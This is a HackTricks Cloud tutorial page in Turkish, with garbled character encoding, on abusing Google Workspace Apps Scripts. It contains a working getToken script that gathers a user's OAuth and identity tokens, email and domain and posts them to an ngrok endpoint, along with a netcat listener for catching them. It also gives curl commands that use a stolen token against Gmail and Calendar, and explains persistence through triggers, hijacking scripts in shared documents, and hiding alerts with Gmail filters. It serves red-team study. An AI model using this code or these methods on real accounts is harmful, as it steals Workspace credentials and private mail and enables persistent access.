# GWS - App Scripts

{% hint style="success" %}
AWS Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## App Scripts

App Scripts, **kodun, App Script'in baÄŸlÄ± olduÄŸu belgeye eriÅŸen dÃ¼zenleyici iznine sahip bir kullanÄ±cÄ± tarafÄ±ndan tetikleneceÄŸi ve OAuth onayÄ±nÄ± kabul ettikten sonra Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ± kodlardÄ±r**.\
AyrÄ±ca sahibi tarafÄ±ndan belirli aralÄ±klarla **Ã§alÄ±ÅŸtÄ±rÄ±lacak ÅŸekilde de ayarlanabilirler** (KalÄ±cÄ±lÄ±k).

### App Script OluÅŸturma

App Script oluÅŸturmanÄ±n birkaÃ§ yolu vardÄ±r, ancak en yaygÄ±n olanlarÄ± **herhangi bir tÃ¼rdeki bir Google Belgesinden** ve **baÄŸÄ±msÄ±z bir proje olarak** oluÅŸturmaktÄ±r:

<details>

<summary>Google Docs, Sheets veya Slides'dan baÄŸlÄ± bir proje oluÅŸturma</summary>

1. Bir Docs belgesi, bir Sheets elektronik tablosu veya bir Slides sunumu aÃ§Ä±n.
2. **UzantÄ±lar** > **Google Apps Script**'i tÄ±klayÄ±n.
3. Betik dÃ¼zenleyicide, **BaÅŸlÄ±ksÄ±z proje**'yi tÄ±klayÄ±n.
4. Projenize bir ad verin ve **Yeniden AdlandÄ±r**'Ä± tÄ±klayÄ±n.

</details>

<details>

<summary>BaÄŸÄ±msÄ±z bir proje oluÅŸturma</summary>

Apps Script'ten baÄŸÄ±msÄ±z bir proje oluÅŸturmak iÃ§in:

1. [`script.google.com`](https://script.google.com/) adresine gidin.
2. **Yeni Proje Ekle**'yi tÄ±klayÄ±n.
3. Betik dÃ¼zenleyicide, **BaÅŸlÄ±ksÄ±z proje**'yi tÄ±klayÄ±n.
4. Projenize bir ad verin ve **Yeniden AdlandÄ±r**'Ä± tÄ±klayÄ±n.

</details>

<details>

<summary>Google Drive'dan baÄŸÄ±msÄ±z bir proje oluÅŸturma</summary>

1. [Google Drive](https://drive.google.com/) adresini aÃ§Ä±n.
2. **Yeni** > **Daha Fazla** > **Google Apps Script**'i tÄ±klayÄ±n.

</details>

<details>

<summary>Google Forms'tan baÄŸlÄ± bir proje oluÅŸturma</summary>

1. Google Forms'ta bir form aÃ§Ä±n.
2. Daha Fazla more\_vert > **Betik DÃ¼zenleyici**'ni tÄ±klayÄ±n.
3. Betik dÃ¼zenleyicide, **BaÅŸlÄ±ksÄ±z proje**'yi tÄ±klayÄ±n.
4. Projenize bir ad verin ve **Yeniden AdlandÄ±r**'Ä± tÄ±klayÄ±n.

</details>

<details>

<summary>clasp komut satÄ±rÄ± aracÄ±nÄ± kullanarak baÄŸÄ±msÄ±z bir proje oluÅŸturma</summary>

`clasp`, terminalden Apps Script projeleri oluÅŸturmanÄ±za, Ã§ekmenize/itmekmenize ve daÄŸÄ±tmanÄ±za olanak tanÄ±yan bir komut satÄ±rÄ± aracÄ±dÄ±r.

Daha fazla ayrÄ±ntÄ± iÃ§in [clasp kullanarak Komut SatÄ±rÄ± ArayÃ¼zÃ¼ kÄ±lavuzunu](https://developers.google.com/apps-script/guides/clasp) inceleyin.

</details>

## App Script Senaryosu <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Script ile Google Sheet OluÅŸturma

Bir App Script oluÅŸturmaya baÅŸlamak iÃ§in, bu senaryo iÃ§in bir Google Sheet oluÅŸturmanÄ±zÄ± Ã¶neririm ve **`UzantÄ±lar > App Scripts`'e gidin**, bu size baÄŸlÄ± bir **yeni App Script aÃ§acaktÄ±r**.

### Token sÄ±zdÄ±rma

OAuth belirteci eriÅŸimini vermek iÃ§in **`Hizmetler +`'Ä± tÄ±klayÄ±n ve ÅŸu gibi kapsamlar ekleyin**:

* **AdminDirectory**: Dizin kullanÄ±cÄ±larÄ±na ve gruplarÄ±na eriÅŸim (kullanÄ±cÄ± yeterli izinlere sahipse)
* **Gmail**: Gmail verilerine eriÅŸim iÃ§in
* **Drive**: Drive verilerine eriÅŸim iÃ§in
* **Google Sheets API**: Tetikleyiciyle Ã§alÄ±ÅŸmasÄ± iÃ§in

**Gerekli kapsamlarÄ±** kendiniz deÄŸiÅŸtirmek iÃ§in projenin ayarlarÄ±na gidip: **`DÃ¼zenleyicide "appsscript.json" manifest dosyasÄ±nÄ± gÃ¶ster`'i etkinleÅŸtirin.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Ä°steÄŸi yakalamak iÃ§in sadece ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Ä°zinlerin istendiÄŸi App Script'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Harici bir istek yapÄ±ldÄ±ÄŸÄ±nda OAuth uyarÄ±sÄ± aynÄ± zamanda **harici uÃ§ noktalara eriÅŸim izni** isteyecektir.
{% endhint %}

### Tetikleyici OluÅŸturma

App okunduÄŸunda, tetikleyici oluÅŸturmak iÃ§in **â° Tetikleyiciler** Ã¼zerine tÄ±klayÄ±n. **Fonksiyon** olarak **`getToken`**'Ä± seÃ§in, daÄŸÄ±tÄ±mda Ã§alÄ±ÅŸacak ÅŸekilde **`Head`**'i, olay kaynaÄŸÄ± olarak **`Tablodan`** ve olay tÃ¼rÃ¼nÃ¼ **`AÃ§Ä±ldÄ±ÄŸÄ±nda`** veya **`DÃ¼zenlendiÄŸinde`** (ihtiyacÄ±nÄ±za gÃ¶re) seÃ§in ve kaydedin.

App Script'in **Ã§alÄ±ÅŸmalarÄ±nÄ± hata ayÄ±klamak isterseniz, UygulamalarÄ± sekmesinde Ã§alÄ±ÅŸmalarÄ± kontrol edebilirsiniz**.

### PaylaÅŸÄ±m

App Script'i **tetiklemek** iÃ§in kurbanÄ±n **DÃ¼zenleyici EriÅŸimi** ile baÄŸlantÄ± kurmasÄ± gerekmektedir.

{% hint style="success" %}
App Script'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lan **token**, tetikleyiciyi oluÅŸturan kiÅŸinin **token**'Ä± olacaktÄ±r, dosya diÄŸer kullanÄ±cÄ±lar tarafÄ±ndan DÃ¼zenleyici olarak aÃ§Ä±lsa bile.
{% endhint %}

### Benimle PaylaÅŸÄ±lan Belgelerin KÃ¶tÃ¼ye KullanÄ±mÄ±

{% hint style="danger" %}
EÄŸer birisi size App Script'ler ve App Script'in **Head**'ini kullanan bir tetikleyici iÃ§eren bir belge paylaÅŸtÄ±ysa, App Script kodunu deÄŸiÅŸtirebilir (Ã¶rneÄŸin, token Ã§alma fonksiyonlarÄ±nÄ± ekleyebilir), buna eriÅŸebilir ve **App Script, belgeyi sizinle paylaÅŸan kullanÄ±cÄ±nÄ±n izinleriyle Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**! (unutmayÄ±n ki sahibin OAuth token'Ä±, tetikleyici oluÅŸturulurken verilen eriÅŸim kapsamlarÄ±na sahip olacaktÄ±r).

Birisi betiÄŸi deÄŸiÅŸtirdiÄŸinde, betiÄŸi oluÅŸturan kiÅŸiye bir **bildirim gÃ¶nderilecektir** (UyarÄ±yÄ± Ã¶nlemek iÃ§in bir filtre oluÅŸturmak iÃ§in gmail izinlerini kullanmak ne dersiniz?)
{% endhint %}

{% hint style="success" %}
EÄŸer bir **saldÄ±rgan App Script'in kapsamlarÄ±nÄ± deÄŸiÅŸtirirse**, gÃ¼ncellemeler belgeye **uygulanmayacaktÄ±r** ta ki deÄŸiÅŸikliklerle yeni bir tetikleyici oluÅŸturulana kadar. Bu nedenle, bir saldÄ±rgan, oluÅŸturduÄŸu tetikleyicide belirlediÄŸi kapsamlardan daha fazla kapsama sahip sahibin oluÅŸturucu token'Ä±nÄ± Ã§alamayacaktÄ±r.
{% endhint %}

### PaylaÅŸmak Yerine Kopyalamak

Bir belgeyi paylaÅŸmak iÃ§in bir baÄŸlantÄ± oluÅŸturduÄŸunuzda ÅŸÃ¶yle bir baÄŸlantÄ± oluÅŸturulur: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
EÄŸer sonundaki **"/edit"**'i **"/copy"** ile deÄŸiÅŸtirirseniz, google'a eriÅŸmek yerine size belgenin bir kopyasÄ±nÄ± oluÅŸturup oluÅŸturmak isteyip istemediÄŸinizi soracaktÄ±r:

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

KullanÄ±cÄ± kopyaladÄ±ÄŸÄ±nda, hem **belgenin iÃ§eriÄŸi hem de App Script'ler kopyalanacaktÄ±r**, ancak **tetikleyiciler kopyalanmayacaktÄ±r**, bu nedenle **hiÃ§bir ÅŸey Ã§alÄ±ÅŸtÄ±rÄ±lmayacaktÄ±r**.

### Web UygulamasÄ± Olarak PaylaÅŸma

Bir App Script'i **Web uygulamasÄ± olarak paylaÅŸmak** da mÃ¼mkÃ¼ndÃ¼r (App Script'in DÃ¼zenleyicisi'nde bir Web uygulamasÄ± olarak daÄŸÄ±tÄ±n), ancak ÅŸu gibi bir uyarÄ± gÃ¶rÃ¼necektir:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Gerekli izinleri isteyen **tipik OAuth uyarÄ±sÄ±nÄ±n ardÄ±ndan** devam edin.

### Test Etme

Toplanan bir token'Ä± e-postalarÄ± listelemek iÃ§in test edebilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

KullanÄ±cÄ±nÄ±n takvimini listele:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Uygulama BetiÄŸi Olarak KalÄ±cÄ±lÄ±k

KalÄ±cÄ±lÄ±k iÃ§in bir seÃ§enek, **bir belge oluÅŸturmak ve getToken iÅŸlevi iÃ§in bir tetikleyici eklemek ve belgeyi saldÄ±rganla paylaÅŸmak** olabilir, bÃ¶ylece saldÄ±rgan her dosyayÄ± aÃ§tÄ±ÄŸÄ±nda **kurbanÄ±n belirteci dÄ±ÅŸa aktarÄ±lÄ±r.**

AyrÄ±ca bir Uygulama BetiÄŸi oluÅŸturmak ve her X sÃ¼re (Ã¶rneÄŸin her dakika, saat, gÃ¼n...) iÃ§in tetikleyici yapmak da mÃ¼mkÃ¼ndÃ¼r. Bir saldÄ±rgan, **kompromize edilmiÅŸ kimlik bilgilerine veya bir kurbanÄ±n oturumuna sahipse bir Uygulama BetiÄŸi zaman tetikleyicisi ayarlayabilir ve her gÃ¼n Ã§ok ayrÄ±calÄ±klÄ± bir OAuth belirteci sÄ±zdÄ±rabilir**:

Sadece bir Uygulama BetiÄŸi oluÅŸturun, Tetikleyicilere gidin, Tetikleyici Ekle'yi tÄ±klayÄ±n ve olay kaynaÄŸÄ± olarak Zaman tabanlÄ± seÃ§in ve size en uygun seÃ§enekleri seÃ§in:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Bu, bu konuda bir gÃ¼venlik uyarÄ±sÄ± e-postasÄ± ve bir itme mesajÄ± oluÅŸturacak ve bunun hakkÄ±nda sizi bilgilendirecektir.
{% endhint %}

### PaylaÅŸÄ±lan Belge DoÄŸrulanmamÄ±ÅŸ Ä°zin GeÃ§iÅŸi

DahasÄ±, biri size **dÃ¼zenleyici eriÅŸimi ile bir belge paylaÅŸtÄ±ysa**, belge iÃ§inde **Uygulama Betikleri oluÅŸturabilir** ve belgenin **SAHÄ°BÄ° (oluÅŸturan) Uygulama BetiÄŸinin sahibi olacaktÄ±r**.

{% hint style="warning" %}
Bu, **belge oluÅŸturanÄ±n, belge iÃ§inde dÃ¼zenleyici eriÅŸimi olan herhangi bir Uygulama BetiÄŸi oluÅŸturanÄ±n oluÅŸturucusu olarak gÃ¶rÃ¼neceÄŸi anlamÄ±na gelir.

Bu ayrÄ±ca, belge oluÅŸturanÄ±n **Workspace ortamÄ± tarafÄ±ndan Uygulama BetiÄŸine gÃ¼venileceÄŸi anlamÄ±na gelir.**
{% endhint %}

{% hint style="danger" %}
Bu ayrÄ±ca, eÄŸer bir **Uygulama BetiÄŸi zaten varsa** ve insanlar **eriÅŸim vermiÅŸse**, belgedeki **DÃ¼zenleyici** iznine sahip herhangi biri **bunu deÄŸiÅŸtirebilir ve bu eriÅŸimi kÃ¶tÃ¼ye kullanabilir.**\
Bunu kÃ¶tÃ¼ye kullanmak iÃ§in insanlarÄ±n Uygulama BetiÄŸini tetiklemeleri gerekir. Ve bir hileli yÃ¶ntem de **betiÄŸi bir web uygulamasÄ± olarak yayÄ±nlamaktÄ±r**. Ä°nsanlar, Uygulama BetiÄŸine zaten **eriÅŸim vermiÅŸse** ve web sayfasÄ±na eriÅŸirlerse, Uygulama BetiÄŸini **tetikleyeceklerdir** (bu ayrÄ±ca `<img>` etiketleri kullanÄ±larak da Ã§alÄ±ÅŸÄ±r).
{% endhint %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
{% endhint %}
